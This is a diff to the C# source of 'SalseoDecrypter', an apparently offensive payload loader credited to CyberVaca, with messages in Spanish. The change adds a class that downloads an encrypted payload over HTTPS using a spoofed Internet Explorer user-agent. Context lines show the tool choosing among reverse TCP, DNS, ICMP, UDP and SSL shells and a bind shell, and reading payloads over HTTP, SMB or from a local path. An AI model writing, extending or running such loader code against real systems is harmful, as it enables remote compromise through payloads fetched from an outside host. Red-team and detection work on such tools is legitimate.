@@ -1,4 +1,4 @@
-/*
+﻿/*
  * Created by SharpDevelop.
  * User: CyberVaca 
  * Twitter: https://twitter.com/CyberVaca_
@@ -114,7 +114,8 @@ namespace SalseoDecrypter
             if (funcion == "reverseicmp") { if (args.Length < 4) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
             if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
             Console.ForegroundColor = ConsoleColor.Gray;
-            if (args[1].ToString().Substring(0, 4).ToLower() == "http") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
+            if (args[1].ToString().Substring(0, 5).ToLower() == "http:") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
+            if (args[1].ToString().Substring(0, 5).ToLower() == "https") { Salseo_Encriptado = ClienteWebhttps.LeePayload(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 4).ToLower() != "http" && args[1].ToString().Substring(0, 2).ToLower() != "\\\\") { Console.WriteLine("[+] Leyendo datos via LOCAL..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
             //#############################################################
@@ -340,6 +341,41 @@ namespace SalseoDecrypter
 
         }
     }
+    
+    public class ClienteWebhttps
+    {
+
+
+        public static string LeePayload(string URL)
+        {
+
+            try
+            {
+            	System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls; 
+                Console.ForegroundColor = ConsoleColor.Gray;
+                Console.WriteLine("[+] Leyendo datos via HTTPS...");
+                WebClient client = new WebClient();
+                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
+                client.Headers.Add("Cache-Control", "no-cache");
+                Stream data = client.OpenRead(URL);
+                StreamReader reader = new StreamReader(data);
+                string Salseo_Encriptado = reader.ReadToEnd();
+                data.Close();
+                reader.Close();
+                return Salseo_Encriptado;
+            }
+            catch
+            {
+
+                Console.WriteLine("[-] Error: No se pudo conectar con la URL proporcionada :(");
+                Environment.Exit(1);
+                return "[-] Error: No se pudo conectar con la URL proporcionada :(";
+
+            }
+
+        }
+    }
+
 
 
     public class LeeArchivoSMBorLocal
